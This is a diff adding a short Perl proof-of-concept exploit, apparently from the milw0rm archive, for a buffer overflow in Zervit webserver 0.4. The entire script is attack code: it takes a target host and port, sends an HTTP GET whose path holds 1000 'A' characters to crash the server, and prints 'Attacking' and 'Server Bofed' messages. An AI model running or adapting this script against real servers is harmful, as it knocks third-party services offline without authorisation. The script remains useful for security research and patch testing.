@@ -1,0 +1,23 @@
+#!/usr/bin/perl
+# Zervit webserver 0.4 Bof Poc
+# make it just for fun :s
+use LWP::Simple;
+use LWP::UserAgent;
+ 
+if (@ARGV < 2) {
+            print("Usage: $0 <url> <port>\n");
+            print("TARGETS are\n ");
+            print("Example: perl $0 127.0.0.1 777 \n");
+            exit(1);
+                    }
+                    ($target, $port) = @ARGV;
+        print("Zervit Webserver 0.04 bof xpl : Coded by Stack!\n");
+        print("Attacking $target on port $port!\n");
+        print("Ddossing .......\n");
+        $dos ="\x41" x 1000 ;
+        $temp="/" x 2;
+         my $url= "http://". $target. ":" . $port .$temp . $dos;
+            $content=get $url;
+            print("\n Server Bofed");
+
+# milw0rm.com [2009-05-18]
